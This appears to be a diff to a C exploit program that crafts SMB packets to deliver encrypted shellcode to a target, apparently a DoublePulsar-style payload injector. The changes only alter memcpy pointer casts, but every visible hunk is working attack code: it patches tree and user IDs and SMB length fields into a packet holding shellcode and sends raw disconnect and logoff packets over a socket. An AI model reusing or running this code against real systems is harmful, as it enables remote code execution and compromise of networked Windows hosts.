@@ -428,8 +428,8 @@ int main(int argc, char* argv[])
 	memcpy((unsigned char*)big_packet + 82, (unsigned char*)encrypted, EntireShellcodeSize);
 
 	//Update treeID, UserID
-	memcpy((unsigned char*)big_packet + 28, (char*)&treeid, 2);
-	memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);
+	memcpy((unsigned char*)big_packet + 28, (unsigned char*)&treeid, 2);
+	memcpy((unsigned char*)big_packet + 32, (unsigned char*)&userid, 2);
 
 	//patch other values
 	unsigned short TotalDataCount = EntireShellcodeSize;
@@ -440,9 +440,9 @@ int main(int argc, char* argv[])
 	*(WORD*)(big_packet + 0x3b) = DataCount;
 	*(WORD*)(big_packet + 0x43) = byteCount;
 
-	memcpy((unsigned char*)big_packet + 0x27, (char*)&TotalDataCount, 2);
-	memcpy((unsigned char*)big_packet + 0x3b, (char*)&DataCount, 2);
-	memcpy((unsigned char*)big_packet + 0x43, (char*)&byteCount, 2);
+	memcpy((unsigned char*)big_packet + 0x27, (unsigned char*)&TotalDataCount, 2);
+	memcpy((unsigned char*)big_packet + 0x3b, (unsigned char*)&DataCount, 2);
+	memcpy((unsigned char*)big_packet + 0x43, (unsigned char*)&byteCount, 2);
 
 
 	//patch SMB length
@@ -450,7 +450,7 @@ int main(int argc, char* argv[])
 	printf("NetBIOS value of the SMB Length:  %hu\n", smb_length);
 
 	unsigned short smb_htons_len = htons(EntireShellcodeSize + 12 + 70 - 4);
-	memcpy((unsigned char*)big_packet + 2, (char*)&smb_htons_len, 2);
+	memcpy((unsigned char*)big_packet + 2, (unsigned char*)&smb_htons_len, 2);
 
 	int size_big_packet = EntireShellcodeSize + 82;
 	printf("TOTAL Size of packet = %d\nThis value is +4 the NetBIOS value length\n", size_big_packet);
@@ -512,8 +512,8 @@ int main(int argc, char* argv[])
 		"\x00\x08\x41\x00\x00\x00\x00";
 
 	//Update treeID, UserID
-	memcpy((unsigned char*)disconnect_packet + 28, (char*)&treeid, 2);
-	memcpy((unsigned char*)disconnect_packet + 32, (char*)&userid, 2);
+	memcpy((unsigned char*)disconnect_packet + 28, (unsigned char*)&treeid, 2);
+	memcpy((unsigned char*)disconnect_packet + 32, (unsigned char*)&userid, 2);
 
 	//send the disconnect packet
 	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
@@ -526,8 +526,8 @@ int main(int argc, char* argv[])
 		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";
 
 	//Update treeID, UserID
-	memcpy((unsigned char*)logoff_packet + 28, (char*)&treeid, 2);
-	memcpy((unsigned char*)logoff_packet + 32, (char*)&userid, 2);
+	memcpy((unsigned char*)logoff_packet + 28, (unsigned char*)&treeid, 2);
+	memcpy((unsigned char*)logoff_packet + 32, (unsigned char*)&userid, 2);
 
 	//send the logoff packet
 	send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
